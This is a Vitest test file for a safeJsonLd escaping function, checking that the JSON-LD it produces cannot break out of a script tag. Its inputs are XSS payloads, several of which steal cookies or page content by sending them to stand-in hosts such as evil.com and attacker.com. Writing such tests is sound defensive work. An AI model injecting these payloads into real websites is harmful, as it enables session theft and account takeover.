import { describe, it, expect } from "vitest";
import { safeJsonLd } from "../json-ld";

describe("safeJsonLd - XSS Prevention", () => {
  describe("Script tag injection prevention", () => {
    it("escapes </script> tag in title field", () => {
      const jsonLd = {
        "@context": "https://schema.org",
        "@type": "NewsArticle",
        headline: "Breaking News</script><script>alert('XSS')</script>",
      };
      const result = safeJsonLd(jsonLd);
      
      // Should not contain literal </script> tag
      expect(result).not.toContain("</script>");
      expect(result).not.toContain("<script>");
      
      // Should contain escaped versions
      expect(result).toContain("\\u003c/script\\u003e");
      expect(result).toContain("\\u003cscript\\u003e");
    });

    it("escapes </script> tag in excerpt field", () => {
      const jsonLd = {
        "@context": "https://schema.org",
        "@type": "NewsArticle",
        description: "Article excerpt</script><script>document.location='http://evil.com'</script>",
      };
      const result = safeJsonLd(jsonLd);
      
      expect(result).not.toContain("</script>");
      expect(result).not.toContain("<script>");
      expect(result).toContain("\\u003c/script\\u003e");
    });

    it("escapes </script> tag in category field", () => {
      const jsonLd = {
        "@context": "https://schema.org",
        "@type": "NewsArticle",
        articleSection: "News</script><script>fetch('http://attacker.com?cookie='+document.cookie)</script>",
      };
      const result = safeJsonLd(jsonLd);
      
      expect(result).not.toContain("</script>");
      expect(result).not.toContain("<script>");
      expect(result).toContain("\\u003c/script\\u003e");
    });

    it("escapes multiple script injection attempts in same object", () => {
      const jsonLd = {
        "@context": "https://schema.org",
        "@type": "NewsArticle",
        headline: "Title</script><script>alert(1)</script>",
        description: "Desc</script><script>alert(2)</script>",
        articleSection: "Cat</script><script>alert(3)</script>",
      };
      const result = safeJsonLd(jsonLd);
      
      // Verify no literal script tags remain
      expect(result).not.toContain("<script>");
      expect(result).not.toContain("</script>");
      
      // Verify escaped versions are present
      expect(result).toContain("\\u003cscript\\u003e");
      expect(result).toContain("\\u003c/script\\u003e");
    });
  });

  describe("HTML-significant character escaping", () => {
    it("escapes < character", () => {
      const jsonLd = { value: "a < b" };
      const result = safeJsonLd(jsonLd);
      
      expect(result).not.toContain("<");
      expect(result).toContain("\\u003c");
    });

    it("escapes > character", () => {
      const jsonLd = { value: "a > b" };
      const result = safeJsonLd(jsonLd);
      
      expect(result).not.toContain(">");
      expect(result).toContain("\\u003e");
    });

    it("escapes & character", () => {
      const jsonLd = { value: "Tom & Jerry" };
      const result = safeJsonLd(jsonLd);
      
      expect(result).not.toContain("&");
      expect(result).toContain("\\u0026");
    });

    it("escapes all HTML-significant characters together", () => {
      const jsonLd = { value: "<div>Test & Example</div>" };
      const result = safeJsonLd(jsonLd);
      
      expect(result).not.toContain("<");
      expect(result).not.toContain(">");
      expect(result).not.toContain("&");
      expect(result).toContain("\\u003c");
      expect(result).toContain("\\u003e");
      expect(result).toContain("\\u0026");
    });
  });

  describe("Unicode line separator escaping", () => {
    it("escapes U+2028 (line separator)", () => {
      const jsonLd = { value: "Line\u2028Break" };
      const result = safeJsonLd(jsonLd);
      
      expect(result).toContain("\\u2028");
      expect(result).not.toContain("\u2028");
    });

    it("escapes U+2029 (paragraph separator)", () => {
      const jsonLd = { value: "Paragraph\u2029Break" };
      const result = safeJsonLd(jsonLd);
      
      expect(result).toContain("\\u2029");
      expect(result).not.toContain("\u2029");
    });
  });

  describe("Real-world attack scenarios", () => {
    it("prevents stored XSS via article title with script injection", () => {
      // Simulating an editor creating a malicious article
      const maliciousPost = {
        "@context": "https://schema.org",
        "@type": "NewsArticle",
        headline: "Important Update</script><script>alert(document.cookie)</script><script>",
        description: "This is a legitimate article description",
        articleSection: "Community News",
      };
      
      const result = safeJsonLd(maliciousPost);
      
      // Verify the output is safe for embedding in HTML
      expect(result).not.toContain("</script>");
      expect(result).not.toContain("<script>");
      
      // Verify JSON is still valid
      expect(() => JSON.parse(result)).not.toThrow();
      
      // Verify the data is preserved (just escaped)
      const parsed = JSON.parse(result);
      expect(parsed.headline).toContain("Important Update");
      expect(parsed.headline).toContain("alert(document.cookie)");
    });

    it("prevents XSS via excerpt field with event handler injection", () => {
      const maliciousPost = {
        "@context": "https://schema.org",
        "@type": "NewsArticle",
        headline: "Normal Title",
        description: "</script><img src=x onerror=alert('XSS')><script>",
        articleSection: "News",
      };
      
      const result = safeJsonLd(maliciousPost);
      
      expect(result).not.toContain("</script>");
      expect(result).not.toContain("<img");
      // Note: "onerror" is not a special character, so it remains in the output
      // but the angle brackets are escaped, making it harmless
      expect(result).toContain("\\u003c");
      expect(result).toContain("\\u003e");
      
      // Verify the dangerous tags are escaped
      expect(result).toContain("\\u003c/script\\u003e");
      expect(result).toContain("\\u003cimg");
    });

    it("prevents XSS via category field with data exfiltration attempt", () => {
      const maliciousPost = {
        "@context": "https://schema.org",
        "@type": "NewsArticle",
        headline: "Article Title",
        description: "Article description",
        articleSection: "News</script><script>fetch('https://evil.com?data='+btoa(document.body.innerHTML))</script>",
      };
      
      const result = safeJsonLd(maliciousPost);
      
      expect(result).not.toContain("</script>");
      expect(result).not.toContain("<script>");
      expect(result).toContain("\\u003c/script\\u003e");
      expect(result).toContain("\\u003cscript\\u003e");
    });

    it("prevents cross-user XSS targeting privileged users", () => {
      // An editor creates a post that targets admin users viewing the article
      const maliciousPost = {
        "@context": "https://schema.org",
        "@type": "NewsArticle",
        headline: "Admin Notice</script><script>if(document.cookie.includes('admin')){fetch('https://attacker.com/steal?c='+document.cookie)}</script>",
        description: "Important administrative update",
        articleSection: "Announcements",
      };
      
      const result = safeJsonLd(maliciousPost);
      
      // Verify no executable script can be injected
      expect(result).not.toContain("</script>");
      expect(result).not.toContain("<script>");
      
      // Verify the malicious code is safely escaped
      expect(result).toContain("\\u003c/script\\u003e");
      expect(result).toContain("\\u003cscript\\u003e");
      
      // Verify JSON remains valid
      const parsed = JSON.parse(result);
      expect(parsed.headline).toContain("Admin Notice");
    });

    it("prevents nested script tag variations", () => {
      const jsonLd = {
        value: "</script><script>alert(1)</script><script>alert(2)</script>",
      };
      const result = safeJsonLd(jsonLd);
      
      expect(result).not.toContain("<script>");
      expect(result).not.toContain("</script>");
      expect(result).toContain("\\u003cscript\\u003e");
      expect(result).toContain("\\u003c/script\\u003e");
    });

    it("prevents case variations of script tags", () => {
      const jsonLd = {
        value: "</ScRiPt><sCrIpT>alert('XSS')</ScRiPt>",
      };
      const result = safeJsonLd(jsonLd);
      
      // All angle brackets should be escaped regardless of case
      expect(result).not.toContain("<");
      expect(result).not.toContain(">");
      expect(result).toContain("\\u003c");
      expect(result).toContain("\\u003e");
    });
  });

  describe("JSON validity preservation", () => {
    it("produces valid JSON output", () => {
      const jsonLd = {
        "@context": "https://schema.org",
        "@type": "NewsArticle",
        headline: "Test</script><script>alert(1)</script>",
      };
      const result = safeJsonLd(jsonLd);
      
      expect(() => JSON.parse(result)).not.toThrow();
    });

    it("preserves data integrity after escaping", () => {
      const original = {
        title: "Article with <tags> & special chars",
        count: 42,
        active: true,
      };
      const result = safeJsonLd(original);
      const parsed = JSON.parse(result);
      
      expect(parsed.title).toBe("Article with <tags> & special chars");
      expect(parsed.count).toBe(42);
      expect(parsed.active).toBe(true);
    });

    it("handles null values correctly", () => {
      const result = safeJsonLd(null);
      expect(result).toBe("null");
    });

    it("handles undefined values correctly", () => {
      const result = safeJsonLd(undefined);
      expect(result).toBe("null");
    });

    it("handles arrays with malicious content", () => {
      const jsonLd = {
        items: ["item1</script><script>alert(1)</script>", "item2"],
      };
      const result = safeJsonLd(jsonLd);
      
      expect(result).not.toContain("</script>");
      expect(result).toContain("\\u003c/script\\u003e");
      
      const parsed = JSON.parse(result);
      expect(parsed.items[0]).toContain("item1");
      expect(parsed.items[0]).toContain("alert(1)");
    });

    it("handles nested objects with malicious content", () => {
      const jsonLd = {
        article: {
          title: "Test</script><script>alert(1)</script>",
          meta: {
            author: "John<script>alert(2)</script>",
          },
        },
      };
      const result = safeJsonLd(jsonLd);
      
      expect(result).not.toContain("<script>");
      expect(result).not.toContain("</script>");
      
      const parsed = JSON.parse(result);
      expect(parsed.article.title).toContain("Test");
      expect(parsed.article.meta.author).toContain("John");
    });
  });

  describe("Edge cases", () => {
    it("handles empty string", () => {
      const result = safeJsonLd("");
      expect(result).toBe('""');
    });

    it("handles empty object", () => {
      const result = safeJsonLd({});
      expect(result).toBe("{}");
    });

    it("handles strings with only special characters", () => {
      const result = safeJsonLd({ value: "<<<>>>&&&" });
      expect(result).not.toContain("<");
      expect(result).not.toContain(">");
      expect(result).not.toContain("&");
    });

    it("handles very long malicious strings", () => {
      const longMalicious = "</script><script>alert(1)</script>".repeat(100);
      const result = safeJsonLd({ value: longMalicious });
      
      expect(result).not.toContain("</script>");
      expect(result).not.toContain("<script>");
    });

    it("handles special characters in property names", () => {
      const jsonLd = {
        "key<with>special&chars": "value",
      };
      const result = safeJsonLd(jsonLd);
      
      // Property names in JSON are also escaped
      expect(result).not.toContain("<");
      expect(result).not.toContain(">");
      expect(result).not.toContain("&");
    });
  });

  describe("Security properties", () => {
    it("ensures no raw HTML can be injected", () => {
      const attacks = [
        "</script><script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<iframe src=javascript:alert(1)>",
        "<svg onload=alert(1)>",
        "<body onload=alert(1)>",
      ];
      
      attacks.forEach((attack) => {
        const result = safeJsonLd({ value: attack });
        expect(result).not.toContain("<");
        expect(result).not.toContain(">");
      });
    });

    it("ensures output is safe for dangerouslySetInnerHTML", () => {
      const jsonLd = {
        "@context": "https://schema.org",
        "@type": "NewsArticle",
        headline: "Test</script><script>alert('XSS')</script>",
        description: "Description with <tags>",
        articleSection: "Category & More",
      };
      
      const result = safeJsonLd(jsonLd);
      
      // Simulate what would happen in the HTML
      const scriptContent = result;
      
      // Verify no script termination is possible
      expect(scriptContent).not.toContain("</script>");
      
      // Verify no new script tags can be created
      expect(scriptContent).not.toContain("<script>");
      
      // Verify all dangerous characters are escaped
      expect(scriptContent).not.toMatch(/<[^>]*>/);
    });

    it("prevents all known XSS vectors in JSON-LD context", () => {
      const xssVectors = [
        "</script><script>alert(document.domain)</script>",
        "</script><script src=//evil.com/xss.js></script>",
        "</script><script>eval(atob('YWxlcnQoMSk='))</script>",
        "</script><script>new Image().src='//evil.com?c='+document.cookie</script>",
        "</script><script>document.write('<img src=x onerror=alert(1)>')</script>",
      ];
      
      xssVectors.forEach((vector) => {
        const result = safeJsonLd({ payload: vector });
        
        // No literal script tags should exist
        expect(result).not.toContain("</script>");
        expect(result).not.toContain("<script>");
        
        // All angle brackets should be escaped
        expect(result).not.toMatch(/<[^\\]/);
        expect(result).not.toMatch(/[^\\]>/);
      });
    });
  });
});
